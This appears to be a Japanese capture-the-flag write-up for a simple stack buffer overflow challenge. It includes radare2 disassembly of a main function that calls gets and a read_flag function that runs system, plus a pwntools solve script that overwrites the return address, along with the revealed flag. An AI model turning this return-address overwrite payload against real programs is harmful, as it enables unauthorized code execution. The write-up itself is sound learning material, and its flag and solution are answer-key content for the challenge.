# second 

## access

```
nc localhost 4102
```

main関数が定義されているので読む  
read_flagとかいうめっちゃそれっぽいやつもある

```Assembly:main

[0x004010f0]> pdf @main
            ; DATA XREF from entry0 @ 0x401111
┌ 53: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x20
│           0x004011f4      f30f1efa       endbr64
│           0x004011f8      55             push rbp
│           0x004011f9      4889e5         mov rbp, rsp
│           0x004011fc      4883ec20       sub rsp, 0x20
│           0x00401200      488d3d0a0e00.  lea rdi, str.buf            ; 0x402011 ; "buf <" ; const char *format
│           0x00401207      b800000000     mov eax, 0
│           0x0040120c      e88ffeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401211      488d45e0       lea rax, [s]
│           0x00401215      4889c7         mov rdi, rax                ; char *s
│           0x00401218      b800000000     mov eax, 0
│           0x0040121d      e89efeffff     call sym.imp.gets           ; char *gets(char *s)
│           0x00401222      b800000000     mov eax, 0
│           0x00401227      c9             leave
└           0x00401228      c3             ret

```

rbp-0x20までスタック領域が確保されている  
変数が1つ、[s]がある

buf <を出力してる  
gets関数で入力を[s]に読み込んでる 
くらいのことがわかる

read_flag関数を読む
```Assembly:read_flag

[0x004011d6]> pdf
┌ 30: sym.read_flag ();
│           0x004011d6      f30f1efa       endbr64
│           0x004011da      55             push rbp
│           0x004011db      4889e5         mov rbp, rsp
│           0x004011de      488d3d1f0e00.  lea rdi, str.cat_flag.txt   ; 0x402004 ; "cat flag.txt" ; const char *string
│           0x004011e5      e8a6feffff     call sym.imp.system         ; int system(const char *string)
│           0x004011ea      bf00000000     mov edi, 0                  ; int status
└           0x004011ef      e8ecfeffff     call sym.imp.exit           ; void exit(int status)


```

``system("cat flag.txt")``するだけ  
この関数を呼び出せばflagに近づける...かもしれない

read_flag関数を起動しようにも呼び出す部分がない...

main関数の変数は、
```
; var char *s @ rbp-0x20
```
[s]はrbp-0x20のようにスタックが確保されている  
[s]への入力を使ってmain関数のリターンアドレスを ~~read_flag関数のアドレス~~ ``system("cat flag.txt")``する命令のアドレスに書き換えれば起動できるかもしれない

バイトオーダはリトルエンディアンでスタック1段の大きさが8バイトであり、それに合わせてペイロードを作る

```python:solve.py
from pwn import *

io = remote('localhost', 4102)
io.sendline("a"*40 + "\xde\x11\x40\x00\x00\x00\x00\x00")
io.interactive()
```

```
[vagrant@fedora32 second]$ python solve.py
[+] Opening connection to localhost on port 4102: Done
[*] Switching to interactive mode
buf <flag{Y0u_c4n_0v3rwr1t3_r3turn_4ddr}
[*] Got EOF while reading in interactive
```

できた!
